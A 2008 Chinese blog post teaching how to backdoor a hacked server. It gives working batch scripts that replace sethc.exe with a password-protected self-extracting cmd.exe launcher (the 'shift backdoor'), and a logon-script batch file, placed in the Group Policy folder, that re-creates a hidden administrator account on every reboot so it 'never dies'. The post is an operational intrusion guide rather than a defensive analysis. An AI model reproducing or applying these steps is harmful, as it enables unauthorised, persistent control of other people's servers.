---
title: shift后门加密版制作及不死3389帐号建立
description: 前段时间去一个流量过百万的站的服务器上参观,朋友加了一个shift后门并称该后门是很久以前他公布的,具体情况我也没多问,回来后自己也做了一个加密码的shift后门.利用winrar加密的.很简单,火力群里一个小弟弟问我怎么做的,叫我写个说明,那么我就简单介绍一下制作过程-Amxking 1.我们首先建立一个名为win.rar的压缩包,及一个批处理命令名为AK.bat的文件. 2.再把这个批处理文件AK.bat加到win.rar压缩包内加密．在高级选项里设置密码如：！＠＃＄％＾＆
date: 2008-01-16 10:44:54
category: 技术文章
tags: ['技术类', '3389', '后门', 'DOS批处理bat', '技巧']
post_id: 334
alias: 5-shift-backdoor-3389
ViewNums: 16202
---

From: [amxking.bokee.com](http://amxking.bokee.com)

前段时间去一个流量过百万的站的服务器上参观,朋友加了一个shift后门并称该后门是很久以前他公布的,具体情况我也没多问,回来后自己也做了一个加密码的[shift后门](/blog/5shift-sethc).利用winrar加密的.很简单,火力群里一个小弟弟问我怎么做的,叫我写个说明,那么我就简单介绍一下制作过程-Amxking

1.我们首先建立一个名为win.rar的压缩包,及一个批处理命令名为AK.bat的文件.

2.再把这个批处理文件AK.bat加到win.rar压缩包内加密．在高级选项里设置密码如：！＠＃＄％＾＆

3.将win.rar做成自解压格式:

添加新的自解压→Default.SFX 图形界面 RAR自解压模块→高级自解压选项→解压后运行(添加: cmd.exe 也有用%SystemRoot%explorer.exe的)→模式→选择:全部隐藏+覆盖所有文件→确定

4.然后我们再建立一个批处理文件RU.BAT,用来将win.exe(win.rar做成自解压后生成的文件)替换到system32下.

主要实现目的为执行:

copy win.exe C:WINDOWSsystem32sethc.exe /y
                     copy win.exe C:WINDOWSsystem32dllcachesethc.exe /y

这是一位网友写的[批处理](/tags/DOS%E6%89%B9%E5%A4%84%E7%90%86bat)RU.BAT,可以借鉴.都是满简单的.

@echo off
cls

copy win.exe C:WINDOWSsystem32sethc.exe
copy win.exe C:WINDOWSsystem32dllcachesethc.exe
attrib C:WINDOWSsystem32sethc.exe sethc.exe
attrib C:WINDOWSsystem32dllcachesethc.exe +h
echo
cls
echo.
del win.exe

del %0%

5.将RU.BAT及WIN.EXE传到肉鸡上并运行RU.BAT就完成了shift后门的安装.

**不死3389帐号:**

关于不死帐号的方法常见的几种中我们今天简单的介绍一种依靠特殊路径开机自动执行BAT命令添加管理帐户的方法.很简单,一看就明白了,这里我也不多做解释了:

制作批处理文件ad.bat ,代码内容为:

@echo off

cls

net user amxking /del
net user amxking !@#$%^&*(000 /add     注释：前面amxking是用户名后面!@#$%^&*(000 是密码,如此设置一是安全目的,二是方便通过具有密码策略的效验,注意不要超过14位,否则有些老版本系统不支持;

net localgroup administrators amxking /add

将ad.bat上传到肉鸡上,路径为:

C:WINDOWSsystem32GroupPolicyUserScriptsLogon

这样只要肉鸡服务器重起就会执行ad.bat将我们的帐户添加并提权为管理帐户.也就实现了所谓的不死帐号.

注意: 路径在具体过程中需要自己修改,别抱着C:WINDOWS就不变,脑袋要灵活点,哪里是%SystemRoot% 就改成哪里.^_^

PS:按[5次shift键后门](/blog/5shift-sethc).exe 工具如果再加些功能比如设置密码,那就不用这么麻烦了

